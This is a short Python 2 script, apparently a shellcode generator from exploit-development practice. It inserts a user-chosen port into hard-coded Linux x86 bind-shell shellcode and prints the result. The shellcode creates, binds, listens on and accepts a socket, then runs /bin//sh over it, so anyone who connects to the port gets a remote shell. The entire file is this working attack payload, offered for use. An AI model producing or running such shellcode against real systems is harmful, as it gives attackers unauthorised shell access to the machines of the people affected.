import sys

if len(sys.argv) is not 2:
	print "Usage: python wrapper.py [PORT NUMBER]"
	exit()
port = int(sys.argv[1])

if port < 1 or port > 65535:
	print "Please enter port within range of 1 - 65535"
	exit()
if port < 1000:
	print "You need to have root privileges to use this port!"

port = format(port,'04x')

port = "\\x"+str(port[0:2])+"\\x"+str(port[2:4])

if "\\x00" in port:
	print "Null's in port, Please select an other port!"
	exit()

shellcode = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x51\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\xb0\\x66\\xb3\\x02\\x31\\xd2\\x52\\x66\\x68%s\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\xb3\\x04\\x31\\xd2\\x52\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x52\\x57\\x89\\xe1\\xcd\\x80\\x93\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\xfe\\xc1\\x80\\xf9\\x04\\x75\\xf5\\x31\\xd2\\x52\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xcd\\x80"%(port)

print shellcode

